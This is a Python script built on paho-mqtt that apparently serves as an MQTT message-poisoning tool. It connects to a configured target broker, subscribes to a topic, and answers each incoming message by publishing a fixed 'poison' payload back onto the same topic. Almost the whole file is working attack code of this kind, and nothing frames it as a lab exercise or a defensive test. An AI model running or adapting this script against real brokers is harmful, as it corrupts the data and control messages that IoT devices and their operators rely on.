import logging
import paho.mqtt.client as mqtt
import CONST


BROKER = CONST.IP_ADDRESS
PORT = CONST.DST_PORT
TOPIC_SUB = CONST.SUBSCRIBE_TOPIC

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(name)s - %(message)s'
)

POISON_MESSAGE = CONST.POISON_MESSAGE
API_VERSION = mqtt.CallbackAPIVersion.VERSION2 if CONST.BIG_MQTT_VERSION == 5 else mqtt.CallbackAPIVersion.VERSION1


def subscribe_callback_3(client, userdata, mid, granted_qos):
    """
    :param client: the client instance for this callback
    :param userdata: the private user data as set in Client() or user_data_set()
    :param mid: matches the mid-variable returned from the corresponding to subscribe() call.
    :param granted_qos: list of integers that give the QoS level the broker has
                          granted for each of the different subscription requests.
    :return:
    """
    if granted_qos[0] is not None and isinstance(granted_qos[0], int) and 0 <= granted_qos[0] <= 2:
        logging.info(
            msg=f'<3>Broker granted the following QoS: {granted_qos[0]}'
        )
        userdata['qos'] = granted_qos[0]
    else:
        logging.info(
            msg=f"<3>Broker rejected you subscription"
        )


def subscribe_callback_5(client, userdata, mid, reason_code_list, properties):
    """
    :param client: the client instance for this callback
    :param userdata: the private user data as set in Client() or user_data_set()
    :param mid: matches the mid-variable returned from the corresponding to subscribe() call.
    :param reason_code_list: reason_code_list: reason codes received from the broker for each subscription.
                          In MQTT v5.0 it's the reason code defined by the standard.
                          In MQTT v3, we convert granted QoS to a reason code.
                          It's a list of ReasonCode instances.
    :param properties: the MQTT v5.0 properties received from the broker.
                          For MQTT v3.1 and v3.1.1 properties is not provided and an empty Properties
                          object is always used.
    :return:
    """
    if reason_code_list[0].is_failure:
        logging.info(
            msg=f'<5>Broker rejected you subscription: {reason_code_list[0]}'
        )
    else:
        logging.info(
            msg=f"<5>Broker granted the following QoS: {reason_code_list[0].value}"
        )
        userdata['qos'] = int(reason_code_list[0].value)


def unsubscribe_callback_3(client, userdata, mid):
    """

    :param client: the client instance for this callback
    :param userdata: the private user data as set in Client() or user_data_set()
    :param mid: matches the mid-variable returned from the corresponding
                          unsubscribe() call.
    :return:
    """
    logging.info(
        msg=f'<3>SHOW EVERYTHING client = <{client}> - userdata = <{userdata}> - mid = <{mid}>'
    )
    client.disconnect()


def unsubscribe_callback_5(client, userdata, mid, properties, v1_reason_codes):
    """

    :param client: the client instance for this callback
    :param userdata: the private user data as set in Client() or user_data_set()
    :param mid: matches the mid-variable returned from the corresponding
                          unsubscribe() call.
    :param properties: the MQTT v5.0 properties received from the broker.
                          For MQTT v3.1 and v3.1.1 properties is not provided and an empty Properties
                          object is always used.
    :param v1_reason_codes: the MQTT v5.0 reason codes received from the broker for each
                          unsubscribe topic.  A list of ReasonCode instances OR a single
                          ReasonCode when we unsubscribe from a single topic.
    :return:
    """
    logging.info(
        msg=f'<5>SHOW EVERYTHING client = <{client}> - userdata = <{userdata}> - mid = <{mid}> - properties = <{properties}> v1_reason_codes = <{v1_reason_codes}>'
    )
    client.disconnect()


def message_callback(client, userdata, message):
    """

    :param client: the client instance for this callback
    :param userdata: the private user data as set in Client() or user_data_set()
    :param MQTTMessage message: the received message.
                    This is a class with members topic, payload, qos, retain.
    :return:
    """
    logging.info(
        msg=f'SHOW MESSAGE = <{message.payload}> AND SEND POISON MESSAGE <{POISON_MESSAGE}>'
    )
    if message.payload != POISON_MESSAGE.encode('utf-8'):
        msg_info = client.publish(topic=message.topic, payload=POISON_MESSAGE, qos=userdata.get('qos', 0), retain=False)
        logging.info(
            msg=f'MESSAGE INFORMATION = <{msg_info}>'
        )



def connect_callback_3(client, userdata, flags, rc):
    """

    :param client: the client instance for this callback
    :param userdata: the private user data as set in Client() or user_data_set()
    :param ConnectFlags flags: the flags for this connection
    :param int rc: the connection result, should have a value of `ConnackCode`
    :return:
    """
    logging.info(
        msg=f'<3>CONNECT START!'
    )
    if rc == 0:
        client.subscribe(TOPIC_SUB)

    else:
        logging.info(
            msg=f"<3>Failed to connect: {rc}. loop_forever() will retry connection"
        )


def connect_callback_5(client, userdata, flags, reason_code, properties):
    """

    :param client: the client instance for this callback
    :param userdata: the private user data as set in Client() or user_data_set()
    :param dict flags: response flags sent by the broker
    :param ReasonCode reason_code: the connection reason code received from the broken.
                       In MQTT v5.0 it's the reason code defined by the standard.
                       In MQTT v3, we convert return code to a reason code, see
                       `convert_connack_rc_to_reason_code()`.
                       `ReasonCode` may be compared to integer.
    :param Properties properties:the MQTT v5.0 properties received from the broker.
                       For MQTT v3.1 and v3.1.1 properties is not provided and an empty Properties
                       object is always used.
    :return:
    """
    logging.info(
        msg=f'<5>CONNECT START!'
    )
    if reason_code.is_failure:
        print(f"<5>Failed to connect: {reason_code}. loop_forever() will retry connection")
    else:
        # we should always subscribe from on_connect callback to be sure
        # our subscribed is persisted across reconnections.
        client.subscribe(TOPIC_SUB)


def publish_callback_5(client, userdata, mid, reason_code, properties):
    """
    发布回调函数，当消息成功发布时被调用（MQTTv5版本）
    """
    logging.info(
        msg=f'PUBLISH SUCCESSFUL 5'
    )


def publish_callback_3(client, userdata, mid):
    """
    发布回调函数，当消息成功发布时被调用
    """
    logging.info(
        msg=f'PUBLISH SUCCESSFUL 3'
    )


def poison(api_version,target_broker, target_port):
    print(f'POISON_MESSAGE = <{POISON_MESSAGE}>')
    print(f'SUB_TOPIC = <{TOPIC_SUB}>')
    mqtt_client = mqtt.Client(callback_api_version=api_version)
    mqtt_client.on_publish = publish_callback_5 if api_version == mqtt.CallbackAPIVersion.VERSION2 else publish_callback_3
    mqtt_client.on_connect = connect_callback_5 if api_version == mqtt.CallbackAPIVersion.VERSION2 else connect_callback_3
    mqtt_client.on_message = message_callback
    mqtt_client.on_subscribe = subscribe_callback_5 if api_version == mqtt.CallbackAPIVersion.VERSION2 else subscribe_callback_3
    mqtt_client.on_unsubscribe = unsubscribe_callback_5 if api_version == mqtt.CallbackAPIVersion.VERSION2 else unsubscribe_callback_3
    qos_dist = {}
    mqtt_client.user_data_set(qos_dist)
    mqtt_client.connect(host=target_broker, port=target_port)
    logging.info(
        msg=f'mqtt_client.loop_forever()!!!'
    )
    print(mqtt_client.user_data_get())
    mqtt_client.loop_forever()


if __name__ == '__main__':
    poison(api_version=API_VERSION, target_broker=BROKER, target_port=PORT)
